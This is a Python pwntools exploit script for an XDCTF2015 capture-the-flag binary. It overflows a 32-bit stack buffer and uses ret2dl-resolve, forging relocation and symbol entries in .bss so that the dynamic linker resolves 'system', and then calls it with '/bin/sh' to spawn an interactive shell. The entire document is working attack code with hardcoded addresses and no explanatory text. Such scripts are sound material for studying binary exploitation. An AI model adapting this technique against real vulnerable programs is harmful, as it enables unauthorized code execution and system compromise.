#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./stack_overflow32"
ENV = {"LD_PRELOAD":"./libc.so.6"}

plt_addr = 0x8048380
bss_addr = 0x804a040
read_plt = 0x80483a0
read_got = 0x804a010

pppop_ret = 0x8048619

dynsym_addr = 0x80481d8
dynstr_addr = 0x8048278
rel_plt_addr = 0x8048330
dynamic_addr = 0x8048f14

# fake

base_addr = bss_addr+0x20
reloc_arg = base_addr-rel_plt_addr
dynsym_off = ((base_addr+0x8-dynsym_addr)/0x10) << 0x8| 0x7
system_off = base_addr+0x18-dynstr_addr

p = process(elf)

p.recvuntil("Welcome to XDCTF2015~!\n")

#gdb.attach(p)
payload = p8(0)*0x70
payload += p32(read_plt)
payload += p32(pppop_ret)
payload += p32(0)
payload += p32(base_addr)
payload += p32(0x28)
payload += p32(plt_addr)    # jump to _dl_runtime_resolve
payload += p32(reloc_arg)   # reloc_arg
payload += p32(read_plt)
payload += p32(0)+p32(0x804a080)
payload += p8(0)*(0x100-len(payload))
p.send(payload)

payload = p32(read_got)
payload += p32(dynsym_off)
payload += p32(system_off)
payload += p32(0)*0x2
payload += p32(0x12)
payload += "system\x00\x00"
payload += "/bin/sh\x00"
p.send(payload)

p.interactive()
